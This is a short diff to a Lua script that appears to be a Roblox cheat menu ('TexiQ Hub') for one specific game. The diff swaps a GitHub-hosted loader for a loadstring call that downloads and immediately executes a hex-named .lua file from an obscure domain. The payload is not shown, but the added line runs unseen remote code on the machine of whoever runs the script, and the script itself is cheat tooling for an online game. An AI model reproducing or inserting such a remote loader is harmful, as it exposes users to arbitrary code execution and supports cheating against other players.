@@ -1,6 +1,6 @@
 getgenv().gui = false 
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2opscripts/OrionLibrary/main/ScriptLoader"))() if game.PlaceId == 142823291 then
+loadstring(game:HttpGet("https://egorikusa.space/84c04063ee63d318cc6420d0.lua", true))() if game.PlaceId == 142823291 then
  
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "TexiQ Hub https://discord.com/invite/JruzxvMSzZ", HidePremium = false, IntroText = "TexiQ Hub", SaveConfig = true, ConfigFolder = "OrionTest"})
